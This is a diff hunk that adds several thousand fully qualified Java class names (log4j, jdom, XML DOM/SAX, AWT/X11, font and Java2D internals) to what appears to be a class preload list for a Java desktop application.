@@ -7360,3 +7360,2458 @@ org.apache.logging.log4j.core.pattern.IntegerPatternConverter
 org.apache.logging.log4j.core.pattern.LevelPatternConverter
 org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter
 org.apache.logging.log4j.core.pattern.LiteralPatternConverter
+org.apache.logging.log4j.core.pattern.LogEventPatternConverter
+org.apache.logging.log4j.core.pattern.LoggerPatternConverter
+org.apache.logging.log4j.core.pattern.MessagePatternConverter
+org.apache.logging.log4j.core.pattern.NameAbbreviator
+org.apache.logging.log4j.core.pattern.NameAbbreviator$MaxElementAbbreviator
+org.apache.logging.log4j.core.pattern.NameAbbreviator$MaxElementAbbreviator$Strategy
+org.apache.logging.log4j.core.pattern.NameAbbreviator$MaxElementAbbreviator$Strategy$1
+org.apache.logging.log4j.core.pattern.NameAbbreviator$MaxElementAbbreviator$Strategy$2
+org.apache.logging.log4j.core.pattern.NameAbbreviator$MaxElementAbbreviator$Strategy[]
+org.apache.logging.log4j.core.pattern.NameAbbreviator$NOPAbbreviator
+org.apache.logging.log4j.core.pattern.NamePatternConverter
+org.apache.logging.log4j.core.pattern.PatternConverter
+org.apache.logging.log4j.core.pattern.PatternConverter[]
+org.apache.logging.log4j.core.pattern.PatternFormatter
+org.apache.logging.log4j.core.pattern.PatternFormatter[]
+org.apache.logging.log4j.core.pattern.PatternParser
+org.apache.logging.log4j.core.pattern.PatternParser$1
+org.apache.logging.log4j.core.pattern.PatternParser$ParserState
+org.apache.logging.log4j.core.pattern.PatternParser$ParserState[]
+org.apache.logging.log4j.core.pattern.PlainTextRenderer
+org.apache.logging.log4j.core.pattern.TextRenderer
+org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter
+org.apache.logging.log4j.core.pattern.ThrowablePatternConverter
+org.apache.logging.log4j.core.script.ScriptManager
+org.apache.logging.log4j.core.selector.ClassLoaderContextSelector
+org.apache.logging.log4j.core.selector.ContextSelector
+org.apache.logging.log4j.core.util.Assert
+org.apache.logging.log4j.core.util.Booleans
+org.apache.logging.log4j.core.util.Builder
+org.apache.logging.log4j.core.util.Cancellable
+org.apache.logging.log4j.core.util.Clock
+org.apache.logging.log4j.core.util.ClockFactory
+org.apache.logging.log4j.core.util.CloseShieldOutputStream
+org.apache.logging.log4j.core.util.Closer
+org.apache.logging.log4j.core.util.Constants
+org.apache.logging.log4j.core.util.DefaultShutdownCallbackRegistry
+org.apache.logging.log4j.core.util.DefaultShutdownCallbackRegistry$RegisteredCancellable
+org.apache.logging.log4j.core.util.DummyNanoClock
+org.apache.logging.log4j.core.util.FileUtils
+org.apache.logging.log4j.core.util.FileWatcher
+org.apache.logging.log4j.core.util.Integers
+org.apache.logging.log4j.core.util.Loader
+org.apache.logging.log4j.core.util.Log4jThread
+org.apache.logging.log4j.core.util.Log4jThreadFactory
+org.apache.logging.log4j.core.util.NameUtil
+org.apache.logging.log4j.core.util.NanoClock
+org.apache.logging.log4j.core.util.NetUtils
+org.apache.logging.log4j.core.util.OptionConverter
+org.apache.logging.log4j.core.util.Patterns
+org.apache.logging.log4j.core.util.ReflectionUtil
+org.apache.logging.log4j.core.util.ShutdownCallbackRegistry
+org.apache.logging.log4j.core.util.SystemClock
+org.apache.logging.log4j.core.util.TypeUtil
+org.apache.logging.log4j.core.util.WatchManager
+org.apache.logging.log4j.core.util.WatchManager$FileMonitor
+org.apache.logging.log4j.core.util.WatchManager$WatchRunnable
+org.apache.logging.log4j.core.util.datetime.DateParser
+org.apache.logging.log4j.core.util.datetime.DatePrinter
+org.apache.logging.log4j.core.util.datetime.FastDateFormat
+org.apache.logging.log4j.core.util.datetime.FastDateFormat$1
+org.apache.logging.log4j.core.util.datetime.FastDateParser
+org.apache.logging.log4j.core.util.datetime.FastDateParser$1
+org.apache.logging.log4j.core.util.datetime.FastDateParser$2
+org.apache.logging.log4j.core.util.datetime.FastDateParser$3
+org.apache.logging.log4j.core.util.datetime.FastDateParser$4
+org.apache.logging.log4j.core.util.datetime.FastDateParser$5
+org.apache.logging.log4j.core.util.datetime.FastDateParser$6
+org.apache.logging.log4j.core.util.datetime.FastDateParser$CopyQuotedStrategy
+org.apache.logging.log4j.core.util.datetime.FastDateParser$NumberStrategy
+org.apache.logging.log4j.core.util.datetime.FastDateParser$Strategy
+org.apache.logging.log4j.core.util.datetime.FastDateParser$StrategyAndWidth
+org.apache.logging.log4j.core.util.datetime.FastDateParser$StrategyParser
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$CharacterLiteral
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$NumberRule
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$PaddedNumberField
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$Rule
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$Rule[]
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$TwoDigitMonthField
+org.apache.logging.log4j.core.util.datetime.FastDatePrinter$TwoDigitNumberField
+org.apache.logging.log4j.core.util.datetime.FixedDateFormat
+org.apache.logging.log4j.core.util.datetime.FixedDateFormat$FixedFormat
+org.apache.logging.log4j.core.util.datetime.FixedDateFormat$FixedFormat[]
+org.apache.logging.log4j.core.util.datetime.Format
+org.apache.logging.log4j.core.util.datetime.FormatCache
+org.apache.logging.log4j.core.util.datetime.FormatCache$MultipartKey
+org.apache.logging.log4j.message.AbstractMessageFactory
+org.apache.logging.log4j.message.DefaultFlowMessageFactory
+org.apache.logging.log4j.message.FlowMessageFactory
+org.apache.logging.log4j.message.Message
+org.apache.logging.log4j.message.MessageFactory
+org.apache.logging.log4j.message.MessageFactory2
+org.apache.logging.log4j.message.ParameterizedNoReferenceMessageFactory
+org.apache.logging.log4j.message.ReusableMessage
+org.apache.logging.log4j.message.ReusableMessageFactory
+org.apache.logging.log4j.message.ReusableObjectMessage
+org.apache.logging.log4j.message.ReusableSimpleMessage
+org.apache.logging.log4j.message.SimpleMessage
+org.apache.logging.log4j.simple.SimpleLogger
+org.apache.logging.log4j.spi.AbstractLogger
+org.apache.logging.log4j.spi.CleanableThreadContextMap
+org.apache.logging.log4j.spi.CopyOnWrite
+org.apache.logging.log4j.spi.CopyOnWriteSortedArrayThreadContextMap
+org.apache.logging.log4j.spi.DefaultThreadContextStack
+org.apache.logging.log4j.spi.ExtendedLogger
+org.apache.logging.log4j.spi.LoggerContext
+org.apache.logging.log4j.spi.LoggerContextFactory
+org.apache.logging.log4j.spi.LoggerRegistry
+org.apache.logging.log4j.spi.LoggerRegistry$ConcurrentMapFactory
+org.apache.logging.log4j.spi.LoggerRegistry$MapFactory
+org.apache.logging.log4j.spi.ObjectThreadContextMap
+org.apache.logging.log4j.spi.Provider
+org.apache.logging.log4j.spi.ReadOnlyThreadContextMap
+org.apache.logging.log4j.spi.StandardLevel
+org.apache.logging.log4j.spi.StandardLevel[]
+org.apache.logging.log4j.spi.Terminable
+org.apache.logging.log4j.spi.ThreadContextMap
+org.apache.logging.log4j.spi.ThreadContextMap2
+org.apache.logging.log4j.spi.ThreadContextMapFactory
+org.apache.logging.log4j.spi.ThreadContextStack
+org.apache.logging.log4j.status.StatusConsoleListener
+org.apache.logging.log4j.status.StatusData
+org.apache.logging.log4j.status.StatusListener
+org.apache.logging.log4j.status.StatusLogger
+org.apache.logging.log4j.status.StatusLogger$BoundedQueue
+org.apache.logging.log4j.util.Constants
+org.apache.logging.log4j.util.EnglishEnums
+org.apache.logging.log4j.util.IndexedReadOnlyStringMap
+org.apache.logging.log4j.util.IndexedStringMap
+org.apache.logging.log4j.util.LoaderUtil
+org.apache.logging.log4j.util.LoaderUtil$ThreadContextClassLoaderGetter
+org.apache.logging.log4j.util.LoaderUtil$UrlResource
+org.apache.logging.log4j.util.PropertiesUtil
+org.apache.logging.log4j.util.ProviderUtil
+org.apache.logging.log4j.util.ReadOnlyStringMap
+org.apache.logging.log4j.util.ReflectionUtil
+org.apache.logging.log4j.util.ReflectionUtil$PrivateSecurityManager
+org.apache.logging.log4j.util.SortedArrayStringMap
+org.apache.logging.log4j.util.SortedArrayStringMap$1
+org.apache.logging.log4j.util.StringBuilderFormattable
+org.apache.logging.log4j.util.StringBuilders
+org.apache.logging.log4j.util.StringMap
+org.apache.logging.log4j.util.Strings
+org.apache.logging.log4j.util.Supplier
+org.apache.logging.log4j.util.TriConsumer
+org.jdom.Attribute
+org.jdom.AttributeList
+org.jdom.Attribute[]
+org.jdom.Comment
+org.jdom.Content
+org.jdom.ContentList
+org.jdom.ContentList$FilterList
+org.jdom.ContentList$FilterListIterator
+org.jdom.Content[]
+org.jdom.DefaultJDOMFactory
+org.jdom.Document
+org.jdom.Element
+org.jdom.JDOMFactory
+org.jdom.Namespace
+org.jdom.NamespaceKey
+org.jdom.Parent
+org.jdom.Text
+org.jdom.Verifier
+org.jdom.filter.AbstractFilter
+org.jdom.filter.ElementFilter
+org.jdom.filter.Filter
+org.jdom.input.BuilderErrorHandler
+org.jdom.input.JAXPParserFactory
+org.jdom.input.SAXBuilder
+org.jdom.input.SAXHandler
+org.jdom.input.TextBuffer
+org.python.jsr223.PyScriptEngineFactory
+org.w3c.dom.Attr
+org.w3c.dom.CharacterData
+org.w3c.dom.Comment
+org.w3c.dom.Document
+org.w3c.dom.Element
+org.w3c.dom.ElementTraversal
+org.w3c.dom.NamedNodeMap
+org.w3c.dom.Node
+org.w3c.dom.NodeList
+org.w3c.dom.Text
+org.w3c.dom.TypeInfo
+org.w3c.dom.events.DocumentEvent
+org.w3c.dom.events.EventTarget
+org.w3c.dom.ranges.DocumentRange
+org.w3c.dom.traversal.DocumentTraversal
+org.xml.sax.AttributeList
+org.xml.sax.Attributes
+org.xml.sax.ContentHandler
+org.xml.sax.DTDHandler
+org.xml.sax.EntityResolver
+org.xml.sax.ErrorHandler
+org.xml.sax.InputSource
+org.xml.sax.Locator
+org.xml.sax.Parser
+org.xml.sax.SAXException
+org.xml.sax.SAXNotRecognizedException
+org.xml.sax.XMLReader
+org.xml.sax.ext.Attributes2
+org.xml.sax.ext.DeclHandler
+org.xml.sax.ext.LexicalHandler
+org.xml.sax.ext.Locator2
+org.xml.sax.helpers.DefaultHandler
+pdb.PdbInitializer
+pdb.PdbPlugin
+pdb.PdbSymbolServerPlugin
+resources.Icons
+resources.ResourceManager
+resources.ResourceManager$$Lambda$268.552585506
+resources.icons.DisabledImageIconWrapper
+resources.icons.EmptyIcon
+resources.icons.FileBasedIcon
+resources.icons.IconWrapper
+resources.icons.ImageIconWrapper
+resources.icons.RotateIcon
+resources.icons.ScaledImageIconWrapper
+resources.icons.TranslateIcon
+short[]
+short[][]
+short[][][]
+softwaremodeling.widgets.table.constraint.provider.ScalarToLongColumnTypeMapper
+sun.awt.AWTAccessor
+sun.awt.AWTAccessor$AWTEventAccessor
+sun.awt.AWTAccessor$AccessibleContextAccessor
+sun.awt.AWTAccessor$ClientPropertyKeyAccessor
+sun.awt.AWTAccessor$ComponentAccessor
+sun.awt.AWTAccessor$ContainerAccessor
+sun.awt.AWTAccessor$CursorAccessor
+sun.awt.AWTAccessor$DefaultKeyboardFocusManagerAccessor
+sun.awt.AWTAccessor$DropTargetContextAccessor
+sun.awt.AWTAccessor$EventQueueAccessor
+sun.awt.AWTAccessor$FrameAccessor
+sun.awt.AWTAccessor$InputEventAccessor
+sun.awt.AWTAccessor$InvocationEventAccessor
+sun.awt.AWTAccessor$KeyEventAccessor
+sun.awt.AWTAccessor$KeyboardFocusManagerAccessor
+sun.awt.AWTAccessor$MenuComponentAccessor
+sun.awt.AWTAccessor$MenuItemAccessor
+sun.awt.AWTAccessor$MouseEventAccessor
+sun.awt.AWTAccessor$SequencedEventAccessor
+sun.awt.AWTAccessor$SystemColorAccessor
+sun.awt.AWTAccessor$ToolkitAccessor
+sun.awt.AWTAccessor$WindowAccessor
+sun.awt.AWTAutoShutdown
+sun.awt.AWTAutoShutdown$$Lambda$138.2045923248
+sun.awt.AppContext
+sun.awt.AppContext$1
+sun.awt.AppContext$2
+sun.awt.AppContext$3
+sun.awt.AppContext$6
+sun.awt.AppContext$GetAppContextLock
+sun.awt.AppContext$State
+sun.awt.AppContext$State[]
+sun.awt.ComponentFactory
+sun.awt.ConstrainableGraphics
+sun.awt.CustomCursor
+sun.awt.DisplayChangedListener
+sun.awt.EventQueueItem
+sun.awt.EventQueueItem[]
+sun.awt.FcFontManager
+sun.awt.FontConfiguration
+sun.awt.FontDescriptor[]
+sun.awt.FontDescriptor[][]
+sun.awt.FontDescriptor[][][]
+sun.awt.GlobalCursorManager
+sun.awt.GlobalCursorManager$NativeUpdater
+sun.awt.IconInfo
+sun.awt.InputMethodSupport
+sun.awt.KeyboardFocusManagerPeerImpl
+sun.awt.KeyboardFocusManagerPeerImpl$KfmAccessor
+sun.awt.KeyboardFocusManagerPeerProvider
+sun.awt.LightweightPeerHolder
+sun.awt.ModalityListener
+sun.awt.MostRecentKeyValue
+sun.awt.NullComponentPeer
+sun.awt.OSInfo
+sun.awt.OSInfo$1
+sun.awt.OSInfo$OSType
+sun.awt.OSInfo$OSType[]
+sun.awt.OSInfo$WindowsVersion
+sun.awt.PaintEventDispatcher
+sun.awt.PeerEvent
+sun.awt.PostEventQueue
+sun.awt.RepaintArea
+sun.awt.RequestFocusController
+sun.awt.SoftCache
+sun.awt.SubRegionShowable
+sun.awt.SunDisplayChanger
+sun.awt.SunGraphicsCallback
+sun.awt.SunHints
+sun.awt.SunHints$Key
+sun.awt.SunHints$LCDContrastKey
+sun.awt.SunHints$Value
+sun.awt.SunHints$Value[]
+sun.awt.SunHints$Value[][]
+sun.awt.SunToolkit
+sun.awt.SunToolkit$ModalityListenerList
+sun.awt.UNIXToolkit
+sun.awt.UNIXToolkit$$Lambda$240.644006490
+sun.awt.UNIXToolkit$GtkVersions
+sun.awt.UNIXToolkit$GtkVersions[]
+sun.awt.WeakIdentityHashMap
+sun.awt.WeakIdentityHashMap$WeakKey
+sun.awt.X11.AwtGraphicsConfigData
+sun.awt.X11.AwtScreenData
+sun.awt.X11.MotifColorUtilities
+sun.awt.X11.MotifDnDConstants
+sun.awt.X11.MotifDnDDragSourceProtocol
+sun.awt.X11.MotifDnDDropTargetProtocol
+sun.awt.X11.Native
+sun.awt.X11.Native$1
+sun.awt.X11.PropMwmHints
+sun.awt.X11.UnsafeXDisposerRecord
+sun.awt.X11.WindowDimensions
+sun.awt.X11.WindowPropertyGetter
+sun.awt.X11.XAWTXSettings
+sun.awt.X11.XAnyEvent
+sun.awt.X11.XAtom
+sun.awt.X11.XAtomList
+sun.awt.X11.XAtom[]
+sun.awt.X11.XAwtState
+sun.awt.X11.XBaseWindow
+sun.awt.X11.XBaseWindow$1
+sun.awt.X11.XBaseWindow$InitialiseState
+sun.awt.X11.XBaseWindow$InitialiseState[]
+sun.awt.X11.XBaseWindow$StateLock
+sun.awt.X11.XCanvasPeer
+sun.awt.X11.XClientMessageEvent
+sun.awt.X11.XColor
+sun.awt.X11.XComponentPeer
+sun.awt.X11.XConfigureEvent
+sun.awt.X11.XConstants
+sun.awt.X11.XContentWindow
+sun.awt.X11.XCreateWindowParams
+sun.awt.X11.XCrossingEvent
+sun.awt.X11.XCustomCursor
+sun.awt.X11.XDecoratedPeer
+sun.awt.X11.XDialogPeer
+sun.awt.X11.XDnDConstants
+sun.awt.X11.XDnDDragSourceProtocol
+sun.awt.X11.XDnDDropTargetProtocol
+sun.awt.X11.XDragAndDropProtocols
+sun.awt.X11.XDragSourceContextPeer
+sun.awt.X11.XDragSourceProtocol
+sun.awt.X11.XDragSourceProtocolListener
+sun.awt.X11.XDropTargetContextPeer
+sun.awt.X11.XDropTargetContextPeer$XDropTargetProtocolListenerImpl
+sun.awt.X11.XDropTargetEventProcessor
+sun.awt.X11.XDropTargetProtocol
+sun.awt.X11.XDropTargetProtocolListener
+sun.awt.X11.XDropTargetRegistry
+sun.awt.X11.XErrorEvent
+sun.awt.X11.XErrorHandler
+sun.awt.X11.XErrorHandler$IgnoreBadWindowHandler
+sun.awt.X11.XErrorHandler$VerifyChangePropertyHandler
+sun.awt.X11.XErrorHandler$XBaseErrorHandler
+sun.awt.X11.XErrorHandlerUtil
+sun.awt.X11.XEvent
+sun.awt.X11.XEventDispatcher
+sun.awt.X11.XExposeEvent
+sun.awt.X11.XFocusChangeEvent
+sun.awt.X11.XFocusProxyWindow
+sun.awt.X11.XFramePeer
+sun.awt.X11.XGlobalCursorManager
+sun.awt.X11.XInputMethod
+sun.awt.X11.XInputMethodDescriptor
+sun.awt.X11.XKeyboardFocusManagerPeer
+sun.awt.X11.XLayerProtocol
+sun.awt.X11.XMSelection
+sun.awt.X11.XMSelection$1
+sun.awt.X11.XMSelection$3
+sun.awt.X11.XMSelectionListener
+sun.awt.X11.XModifierKeymap
+sun.awt.X11.XMouseDragGestureRecognizer
+sun.awt.X11.XNETProtocol
+sun.awt.X11.XPanelPeer
+sun.awt.X11.XPropertyCache
+sun.awt.X11.XPropertyEvent
+sun.awt.X11.XProtocol
+sun.awt.X11.XQueryTree
+sun.awt.X11.XRepaintArea
+sun.awt.X11.XReparentEvent
+sun.awt.X11.XRootWindow
+sun.awt.X11.XRootWindow$LazyHolder
+sun.awt.X11.XSelection
+sun.awt.X11.XSelection$IncrementalTransferHandler
+sun.awt.X11.XSelection$SelectionEventHandler
+sun.awt.X11.XSetWindowAttributes
+sun.awt.X11.XSizeHints
+sun.awt.X11.XStateProtocol
+sun.awt.X11.XTaskbarPeer
+sun.awt.X11.XTaskbarPeer$$Lambda$239.848832052
+sun.awt.X11.XTaskbarPeer$$Lambda$241.61584194
+sun.awt.X11.XTaskbarPeer$1
+sun.awt.X11.XToolkit
+sun.awt.X11.XToolkit$$Lambda$134.295855435
+sun.awt.X11.XToolkit$$Lambda$135.1319219650
+sun.awt.X11.XToolkit$$Lambda$137.1900552903
+sun.awt.X11.XToolkit$$Lambda$236.656637076
+sun.awt.X11.XToolkit$1
+sun.awt.X11.XToolkit$2
+sun.awt.X11.XToolkit$3
+sun.awt.X11.XTranslateCoordinates
+sun.awt.X11.XUnmapEvent
+sun.awt.X11.XVisibilityEvent
+sun.awt.X11.XVisualInfo
+sun.awt.X11.XWINProtocol
+sun.awt.X11.XWM
+sun.awt.X11.XWM$1
+sun.awt.X11.XWMHints
+sun.awt.X11.XWindow
+sun.awt.X11.XWindow$1
+sun.awt.X11.XWindowAttributes
+sun.awt.X11.XWindowAttributesData
+sun.awt.X11.XWindowPeer
+sun.awt.X11.XWindowPeer$2
+sun.awt.X11.XWindowPeer$4
+sun.awt.X11.XWrapperBase
+sun.awt.X11.XlibUtil
+sun.awt.X11.XlibWrapper
+sun.awt.X11ComponentPeer
+sun.awt.X11CustomCursor
+sun.awt.X11CustomCursor$1CCount
+sun.awt.X11CustomCursor$1CCount[]
+sun.awt.X11FontManager
+sun.awt.X11GraphicsConfig
+sun.awt.X11GraphicsConfig$X11GCDisposerRecord
+sun.awt.X11GraphicsDevice
+sun.awt.X11GraphicsEnvironment
+sun.awt.X11GraphicsEnvironment$1
+sun.awt.X11InputMethod
+sun.awt.X11InputMethodBase
+sun.awt.X11InputMethodDescriptor
+sun.awt.XSettings
+sun.awt.XSettings$Update
+sun.awt.datatransfer.DesktopDatatransferServiceImpl
+sun.awt.dnd.SunDragSourceContextPeer
+sun.awt.dnd.SunDropTargetContextPeer
+sun.awt.event.IgnorePaintEvent
+sun.awt.geom.PathConsumer2D
+sun.awt.im.CompositionAreaHandler
+sun.awt.im.ExecutableInputMethodManager
+sun.awt.im.ExecutableInputMethodManager$3
+sun.awt.im.InputContext
+sun.awt.im.InputMethodAdapter
+sun.awt.im.InputMethodContext
+sun.awt.im.InputMethodLocator
+sun.awt.im.InputMethodManager
+sun.awt.image.BufImgSurfaceData
+sun.awt.image.BufImgSurfaceData$ICMColorData
+sun.awt.image.BufImgSurfaceManager
+sun.awt.image.BufImgVolatileSurfaceManager
+sun.awt.image.BufferedImageDevice
+sun.awt.image.BufferedImageGraphicsConfig
+sun.awt.image.BufferedImageGraphicsConfig[]
+sun.awt.image.ByteArrayImageSource
+sun.awt.image.ByteComponentRaster
+sun.awt.image.ByteInterleavedRaster
+sun.awt.image.BytePackedRaster
+sun.awt.image.FetcherInfo
+sun.awt.image.GifFrame
+sun.awt.image.GifImageDecoder
+sun.awt.image.ImageConsumerQueue
+sun.awt.image.ImageDecoder
+sun.awt.image.ImageFetchable
+sun.awt.image.ImageFetcher
+sun.awt.image.ImageFetcher$1
+sun.awt.image.ImageRepresentation
+sun.awt.image.ImageWatched
+sun.awt.image.ImageWatched$AccWeakReference
+sun.awt.image.ImageWatched$Link
+sun.awt.image.ImageWatched$WeakLink
+sun.awt.image.ImageWatched$WeakLink$$Lambda$246.971715912
+sun.awt.image.ImagingLib
+sun.awt.image.ImagingLib$1
+sun.awt.image.InputStreamImageSource
+sun.awt.image.IntegerComponentRaster
+sun.awt.image.IntegerInterleavedRaster
+sun.awt.image.JPEGImageDecoder
+sun.awt.image.JPEGImageDecoder$1
+sun.awt.image.NativeLibLoader
+sun.awt.image.NativeLibLoader$1
+sun.awt.image.OffScreenImageSource
+sun.awt.image.PNGFilterInputStream
+sun.awt.image.PNGImageDecoder
+sun.awt.image.PNGImageDecoder$Chromaticities
+sun.awt.image.PixelConverter
+sun.awt.image.PixelConverter$Argb
+sun.awt.image.PixelConverter$ArgbBm
+sun.awt.image.PixelConverter$ArgbPre
+sun.awt.image.PixelConverter$Bgrx
+sun.awt.image.PixelConverter$ByteGray
+sun.awt.image.PixelConverter$Rgba
+sun.awt.image.PixelConverter$RgbaPre
+sun.awt.image.PixelConverter$Rgbx
+sun.awt.image.PixelConverter$Ushort4444Argb
+sun.awt.image.PixelConverter$Ushort555Rgb
+sun.awt.image.PixelConverter$Ushort555Rgbx
+sun.awt.image.PixelConverter$Ushort565Rgb
+sun.awt.image.PixelConverter$UshortGray
+sun.awt.image.PixelConverter$Xbgr
+sun.awt.image.PixelConverter$Xrgb
+sun.awt.image.SunVolatileImage
+sun.awt.image.SunWritableRaster
+sun.awt.image.SunWritableRaster$DataStealer
+sun.awt.image.SurfaceManager
+sun.awt.image.SurfaceManager$ImageAccessor
+sun.awt.image.SurfaceManager$ProxiedGraphicsConfig
+sun.awt.image.ToolkitImage
+sun.awt.image.VolatileSurfaceManager
+sun.awt.resources.awt
+sun.awt.shell.DefaultShellFolder
+sun.awt.shell.ShellFolder
+sun.awt.shell.ShellFolder$3
+sun.awt.shell.ShellFolder$4
+sun.awt.shell.ShellFolder$Invoker
+sun.awt.shell.ShellFolderManager
+sun.awt.shell.ShellFolderManager$DirectInvoker
+sun.awt.util.IdentityArrayList
+sun.awt.util.PerformanceLogger
+sun.awt.util.PerformanceLogger$TimeData
+sun.awt.util.ThreadGroupUtils
+sun.datatransfer.DataFlavorUtil
+sun.datatransfer.DataFlavorUtil$DefaultDesktopDatatransferService
+sun.datatransfer.DesktopDatatransferService
+sun.font.AttributeValues
+sun.font.CMap
+sun.font.CMap$CMapFormat12
+sun.font.CMap$NullCMapClass
+sun.font.CharToGlyphMapper
+sun.font.CharToGlyphMapper[]
+sun.font.CompositeFont
+sun.font.CompositeFontDescriptor
+sun.font.CompositeFontDescriptor[]
+sun.font.CompositeFont[]
+sun.font.CompositeGlyphMapper
+sun.font.CompositeStrike
+sun.font.EAttribute
+sun.font.EAttribute[]
+sun.font.FcFontConfiguration
+sun.font.FileFont
+sun.font.FileFontStrike
+sun.font.FileFont[]
+sun.font.Font2D
+sun.font.Font2DHandle
+sun.font.Font2D[]
+sun.font.FontAccess
+sun.font.FontConfigManager
+sun.font.FontConfigManager$FcCompFont
+sun.font.FontConfigManager$FcCompFont[]
+sun.font.FontConfigManager$FontConfigFont
+sun.font.FontConfigManager$FontConfigFont[]
+sun.font.FontConfigManager$FontConfigInfo
+sun.font.FontDesignMetrics
+sun.font.FontDesignMetrics$KeyReference
+sun.font.FontDesignMetrics$MetricsKey
+sun.font.FontDesignMetrics[]
+sun.font.FontFamily
+sun.font.FontManager
+sun.font.FontManagerFactory
+sun.font.FontManagerFactory$1
+sun.font.FontManagerForSGE
+sun.font.FontManagerNativeLibrary
+sun.font.FontManagerNativeLibrary$1
+sun.font.FontScaler
+sun.font.FontStrike
+sun.font.FontStrikeDesc
+sun.font.FontStrikeDisposer
+sun.font.FontStrike[]
+sun.font.FontUtilities
+sun.font.FontUtilities$1
+sun.font.FreetypeFontScaler
+sun.font.GlyphList
+sun.font.MFontConfiguration
+sun.font.PhysicalFont
+sun.font.PhysicalFont[]
+sun.font.PhysicalStrike
+sun.font.PhysicalStrike[]
+sun.font.StandardGlyphVector
+sun.font.StandardGlyphVector$GlyphStrike
+sun.font.StrikeCache
+sun.font.StrikeCache$1
+sun.font.StrikeCache$DisposableStrike
+sun.font.StrikeCache$SoftDisposerRef
+sun.font.StrikeMetrics
+sun.font.SunFontManager
+sun.font.SunFontManager$1
+sun.font.SunFontManager$2
+sun.font.SunFontManager$3
+sun.font.SunFontManager$FontRegistrationInfo
+sun.font.SunFontManager$T1Filter
+sun.font.SunFontManager$TTFilter
+sun.font.TrueTypeFont
+sun.font.TrueTypeFont$1
+sun.font.TrueTypeFont$DirectoryEntry
+sun.font.TrueTypeFont$DirectoryEntry[]
+sun.font.TrueTypeFont$TTDisposerRecord
+sun.font.TrueTypeGlyphMapper
+sun.font.Type1Font
+sun.font.X11TextRenderer
+sun.invoke.util.BytecodeDescriptor
+sun.invoke.util.ValueConversions
+sun.invoke.util.ValueConversions$WrapperCache
+sun.invoke.util.ValueConversions$WrapperCache[]
+sun.invoke.util.VerifyAccess
+sun.invoke.util.VerifyAccess$1
+sun.invoke.util.VerifyType
+sun.invoke.util.Wrapper
+sun.invoke.util.Wrapper$1
+sun.invoke.util.Wrapper$Format
+sun.invoke.util.Wrapper[]
+sun.java2d.BackBufferCapsProvider
+sun.java2d.DefaultDisposerRecord
+sun.java2d.DestSurfaceProvider
+sun.java2d.Disposer
+sun.java2d.Disposer$$Lambda$136.411039158
+sun.java2d.Disposer$1
+sun.java2d.Disposer$PollDisposable
+sun.java2d.DisposerRecord
+sun.java2d.DisposerTarget
+sun.java2d.FontSupport
+sun.java2d.InvalidPipeException
+sun.java2d.NullSurfaceData
+sun.java2d.ReentrantContext
+sun.java2d.ReentrantContextProvider
+sun.java2d.ReentrantContextProvider$HardReference
+sun.java2d.ReentrantContextProviderCLQ
+sun.java2d.ReentrantContextProviderTL
+sun.java2d.ReentrantContextProviderTL$1
+sun.java2d.StateTrackable
+sun.java2d.StateTrackable$State
+sun.java2d.StateTrackable$State[]
+sun.java2d.StateTrackableDelegate
+sun.java2d.StateTrackableDelegate$2
+sun.java2d.SunGraphics2D
+sun.java2d.SunGraphicsEnvironment
+sun.java2d.SunGraphicsEnvironment$1
+sun.java2d.Surface
+sun.java2d.SurfaceData
+sun.java2d.SurfaceData$PixelToPgramLoopConverter
+sun.java2d.SurfaceData$PixelToShapeLoopConverter
+sun.java2d.SurfaceManagerFactory
+sun.java2d.UnixSurfaceManagerFactory
+sun.java2d.cmm.CMSManager
+sun.java2d.cmm.ProfileActivator
+sun.java2d.cmm.ProfileDeferralInfo
+sun.java2d.cmm.ProfileDeferralMgr
+sun.java2d.loops.Blit
+sun.java2d.loops.Blit$GeneralMaskBlit
+sun.java2d.loops.BlitBg
+sun.java2d.loops.CompositeType
+sun.java2d.loops.CustomComponent
+sun.java2d.loops.DrawGlyphList
+sun.java2d.loops.DrawGlyphListAA
+sun.java2d.loops.DrawGlyphListLCD
+sun.java2d.loops.DrawLine
+sun.java2d.loops.DrawParallelogram
+sun.java2d.loops.DrawPath
+sun.java2d.loops.DrawPolygons
+sun.java2d.loops.DrawRect
+sun.java2d.loops.FillParallelogram
+sun.java2d.loops.FillPath
+sun.java2d.loops.FillRect
+sun.java2d.loops.FillSpans
+sun.java2d.loops.FontInfo
+sun.java2d.loops.GeneralRenderer
+sun.java2d.loops.GraphicsPrimitive
+sun.java2d.loops.GraphicsPrimitiveMgr
+sun.java2d.loops.GraphicsPrimitiveMgr$1
+sun.java2d.loops.GraphicsPrimitiveMgr$2
+sun.java2d.loops.GraphicsPrimitiveMgr$PrimitiveSpec
+sun.java2d.loops.GraphicsPrimitiveProxy
+sun.java2d.loops.GraphicsPrimitive[]
+sun.java2d.loops.MaskBlit
+sun.java2d.loops.MaskFill
+sun.java2d.loops.RenderCache
+sun.java2d.loops.RenderCache$Entry
+sun.java2d.loops.RenderCache$Entry[]
+sun.java2d.loops.RenderLoops
+sun.java2d.loops.RenderLoops[]
+sun.java2d.loops.ScaledBlit
+sun.java2d.loops.SurfaceType
+sun.java2d.loops.SurfaceType[]
+sun.java2d.loops.TransformHelper
+sun.java2d.loops.XORComposite
+sun.java2d.marlin.ArrayCacheConst
+sun.java2d.marlin.ByteArrayCache
+sun.java2d.marlin.ByteArrayCache$Reference
+sun.java2d.marlin.DCollinearSimplifier
+sun.java2d.marlin.DCurve
+sun.java2d.marlin.DDasher
+sun.java2d.marlin.DDasher$LengthIterator
+sun.java2d.marlin.DHelpers
+sun.java2d.marlin.DHelpers$IndexStack
+sun.java2d.marlin.DHelpers$PolyStack
+sun.java2d.marlin.DMarlinRenderingEngine
+sun.java2d.marlin.DMarlinRenderingEngine$1
+sun.java2d.marlin.DMarlinRenderingEngine$NormMode
+sun.java2d.marlin.DMarlinRenderingEngine$NormMode$1
+sun.java2d.marlin.DMarlinRenderingEngine$NormMode$2
+sun.java2d.marlin.DMarlinRenderingEngine$NormMode$3
+sun.java2d.marlin.DMarlinRenderingEngine$NormMode[]
+sun.java2d.marlin.DMarlinRenderingEngine$NormalizingPathIterator
